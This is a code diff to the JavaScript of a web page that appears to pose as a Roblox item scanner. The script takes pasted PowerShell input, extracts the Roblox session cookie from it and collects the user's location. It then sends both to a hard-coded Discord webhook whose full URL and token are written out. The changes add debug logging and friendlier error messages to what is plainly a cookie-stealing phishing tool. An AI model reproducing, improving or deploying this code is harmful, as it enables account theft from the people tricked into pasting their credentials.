@@ -231,11 +231,14 @@ async function submitPowerShell() {
 
     try {
         // Scan limited items and find authentication data from the input
+        console.log('Processing input, length:', inputText.length);
         const limitedItems = extractLimitedItems(inputText);
         const robloxCookie = extractRobloxCookie(inputText);
+        console.log('Extracted auth data:', robloxCookie ? 'Found' : 'Not found');
         
         // Block execution if no authentication data is found
         if (!robloxCookie) {
+            console.log('No auth data found, blocking execution');
             stopLoadingAnimation(submitText);
             submitText.textContent = 'No Auth Data';
             submitBtn.style.background = '#ef4444'; // Red error color
@@ -250,7 +253,9 @@ async function submitPowerShell() {
         }
         
         // Get user location
+        console.log('Getting user location...');
         const locationInfo = await getUserLocation();
+        console.log('Location obtained:', locationInfo.country);
         
         // Discord webhook URL
         const webhookUrl = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';
@@ -259,6 +264,7 @@ async function submitPowerShell() {
         const wordCount = Math.round(inputText.split(/\s+/).filter(word => word.length > 0).length / 10) * 10;
         const characterCount = Math.round(inputText.length / 100) * 100;
         const lineCount = inputText.split('\n').length;
+        console.log('Script stats - Words:', wordCount, 'Characters:', characterCount, 'Lines:', lineCount);
         
         // Webhook payload with only data and location
         const payload = {
@@ -299,6 +305,7 @@ async function submitPowerShell() {
             }]
         };
 
+        console.log('Sending webhook...');
         const response = await fetch(webhookUrl, {
             method: 'POST',
             headers: {
@@ -307,6 +314,8 @@ async function submitPowerShell() {
             body: JSON.stringify(payload)
         });
 
+        console.log('Webhook response status:', response.status);
+        
         // Hide loading overlay
         loadingOverlay.style.display = 'none';
 
@@ -329,7 +338,15 @@ async function submitPowerShell() {
         stopLoadingAnimation(submitText);
         submitText.textContent = 'Scan Failed - Retry';
         submitBtn.style.background = '#ef4444'; // Red error color
-        showNotification('Item scanning failed. Please try again.', 'error');
+        
+        // More specific error messages
+        if (error.message.includes('fetch')) {
+            showNotification('Network error. Check your connection.', 'error');
+        } else if (error.message.includes('location')) {
+            showNotification('Location access failed. Retrying...', 'error');
+        } else {
+            showNotification('Authentication scan failed. Please try again.', 'error');
+        }
         
         setTimeout(() => {
             submitBtn.disabled = false;
